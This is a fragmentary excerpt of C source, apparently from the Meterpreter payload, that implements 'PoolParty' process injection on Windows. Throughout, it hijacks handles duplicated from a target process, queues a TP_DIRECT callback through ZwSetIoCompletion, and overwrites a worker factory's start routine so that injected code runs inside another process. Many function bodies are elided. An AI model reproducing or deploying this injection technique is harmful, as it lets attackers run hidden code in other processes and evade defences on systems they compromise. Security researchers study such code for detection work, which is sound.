...
// Sentinel to signal "ntdll init done". We no longer resolve individual function
// pointers here — every ntdll call goes through met_api->win_api.ntdll.Zw* which
// hash-resolves the export at call time. Availability is assumed on Win10+ (the
// gate enforced by supports_poolparty_injection below).
NtDll* GetOrInitNtDll() {
    ...
    pNtDll = (NtDll*)met_api->win_api.kernel32.HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(NtDll));
    if (!pNtDll) {
        return NULL;
    }
...
POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationArch) {
    ...
    do {
        ...
        poolLifeguard = (POOLPARTY_INJECTOR*)met_api->win_api.kernel32.HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(POOLPARTY_INJECTOR));
        if (!poolLifeguard) {
            break;
        }
    ...
    if (bError && poolLifeguard != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, poolLifeguard);
        poolLifeguard = NULL;
    }
...
BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
    ...
    NTSTATUS status = met_api->win_api.ntdll.RtlGetVersion((PRTL_OSVERSIONINFOEXW)&os);
    ...
    BOOL bIsWow64 = FALSE;
    BOOL bResult = met_api->win_api.kernel32.IsWow64Process(GetCurrentProcess(), &bIsWow64);
...
HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess) {
    ...
    while (ntStatus != STATUS_SUCCESS) {
        ntStatus = met_api->win_api.ntdll.ZwQueryInformationProcess(hProcess, (INT)ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut);
        dprintf("[INJECT][inject_via_poolparty][get_remote_handle] ZwQueryInformationProcess() : %p", ntStatus);
        if (ntStatus == STATUS_INFO_LENGTH_MISMATCH && dwInformationSizeIn != dwInformationSizeOut) {
            lpProcessInfo = met_api->win_api.kernel32.HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
            if (lpProcessInfo == NULL) {
                dprintf("[INJECT][inject_via_poolparty][get_remote_handle] met_api->win_api.kernel32.HeapReAlloc() for lpProcessInfo returned NULL");
                return INVALID_HANDLE_VALUE;
            }
        ...
        if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_INFO_LENGTH_MISMATCH) {
            met_api->win_api.kernel32.HeapFree(hHeap, 0, lpProcessInfo);
            return INVALID_HANDLE_VALUE;
        }
    }
    ...
    for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
        if (met_api->win_api.kernel32.DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
            ntStatus = met_api->win_api.ntdll.ZwQueryObject(hHijackHandle, (INT)ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
            dprintf("[INJECT][inject_via_poolparty][get_remote_handle] ZwQueryObject result: %p", ntStatus);
            if (dwInformationSizeIn >= dwInformationSizeOut) {
                if (met_api->win_api.kernel32.lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
                    break;
                }
            } else {
                lpObjectInfo = met_api->win_api.kernel32.HeapReAlloc(hHeap, 0, lpObjectInfo, dwInformationSizeOut);
                if (lpObjectInfo == NULL) {
                ...
                met_api->win_api.ntdll.ZwQueryObject(hHijackHandle, (INT)ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);  // get the whole context this time...
                if (met_api->win_api.kernel32.lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
                    break;
                }
            }
    ...
    if (lpObjectInfo != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, lpObjectInfo);
    }
    if (lpProcessInfo != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, lpProcessInfo);
    }
...
DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
    ...
    do {
        ...
        lpDirect = met_api->win_api.kernel32.HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TP_DIRECT_STRUCT_SIZE_X64);
        if (lpDirect == NULL) {
        ...
        if (hHijackHandle != INVALID_HANDLE_VALUE) {
            *(QWORD*)((BYTE*)lpDirect + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD)lpStartAddress;
            ...
            dwResult = met_api->win_api.ntdll.ZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
    ...
    if (lpDirect != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, lpDirect);
    }
    return dwResult;
}
...
DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
    ...
    do {
        ...
        dwResult = met_api->win_api.ntdll.ZwQueryInformationWorkerFactory(hDuplicatedHandle, (INT)WorkerFactoryBasicInformation, &WorkerFactoryBasicInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &ReturnLength);
        dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ZwQueryInformationWorkerFactory returned 0x%x && ReturnLength = %lu", dwResult, ReturnLength);
        if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
            BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ZwQueryInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
        }
        if (lpStub == NULL) {
        ...
        dwResult = met_api->win_api.ntdll.ZwSetInformationWorkerFactory(hDuplicatedHandle, (INT)WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
        dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ZwSetInformationWorkerFactory returned 0x%x", dwResult);
        if (dwResult != STATUS_SUCCESS) {
            BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ZwSetInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
        }

        met_api->win_api.kernel32.Sleep(1000);
        ...
        dwResult = met_api->win_api.ntdll.ZwSetInformationWorkerFactory(hDuplicatedHandle, (INT)WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
        if (dwResult != STATUS_SUCCESS) {
            dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ZwSetInformationWorkerFactory for restoring ThreadMinimum returned 0x%x", dwResult);
    ...
    if (hHeap != NULL && lpStub != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, lpStub);
    }
    if (hHeap != NULL && lpOriginalBytes != NULL) {
        met_api->win_api.kernel32.HeapFree(hHeap, 0, lpOriginalBytes);
    }
    return dwResult;
}
